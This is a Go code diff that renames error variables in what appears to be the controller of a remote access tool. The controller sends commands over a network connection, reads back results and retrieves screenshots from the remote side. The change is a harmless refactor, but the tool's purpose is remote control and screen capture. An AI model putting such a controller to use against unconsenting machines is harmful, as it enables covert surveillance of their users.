@@ -37,14 +37,14 @@ func envio(conexiones net.Conn, envio string) error {
 
 	buffer := make([]byte, BUFFER)
 
-	_, error := conexiones.Write([]byte(envio))
-	if error != nil {
+	_, escritura_error := conexiones.Write([]byte(envio))
+	if escritura_error != nil {
 		return errors.New("[!] hubo un problema durante el envio del comando")
 
 	} else {
 		// retornar los datos
-		num, error := conexiones.Read(buffer)
-		if error != nil {
+		num, lectura_error := conexiones.Read(buffer)
+		if lectura_error != nil {
 			return errors.New("[!] error al recibir la informacion")
 
 		} else {
@@ -60,9 +60,9 @@ func Borrar_consola() error {
 	if runtime.GOOS == "windows" {
 		comandos := exec.Command("powershell", "-command", "clear")
 		comandos.Stdout = os.Stdout
-		error := comandos.Run()
+		comando_error := comandos.Run()
 		fmt.Println(color.Violeta + color.LOGO + color.Reset)
-		if error != nil {
+		if comando_error != nil {
 			return errors.New("[!] error al ejecutar comando")
 		}
 
@@ -105,8 +105,8 @@ func Comando(conexiones net.Conn) error {
 		os.Exit(0)
 	case "ss":
 		fmt.Println(color.Violeta + "[*] esperando la imagen ..." + color.Reset)
-		byte_img, error := ss.Obtener_img(conexiones)
-		if error != nil {
+		byte_img, img_error := ss.Obtener_img(conexiones)
+		if img_error != nil {
 			return errors.New("[!] error al obtener la imagen")
 		}
 		nombre := input.Input("[*] nombre del png (sin extension)>> ")
